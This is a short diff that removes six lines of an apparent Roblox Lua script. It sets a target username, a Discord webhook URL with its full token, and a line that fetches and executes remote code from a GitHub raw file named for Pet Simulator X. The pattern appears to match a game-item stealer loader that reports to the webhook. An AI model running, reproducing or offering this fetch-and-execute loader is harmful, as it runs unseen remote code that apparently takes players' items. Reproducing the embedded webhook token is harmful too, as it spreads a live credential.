@@ -1,6 +1,0 @@
-Username = "qqrspop"
-loadingscreen = true 
-delay = 5 
-farmui = false
-webhook = "https://discord.com/api/webhooks/1268054264215764992/3ux_K-MUb85QqQQuGj3X05y0E7cSDz_k41zXPJj-B6-sk4nWOqhkM25n9YfEh3JF2_iA"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
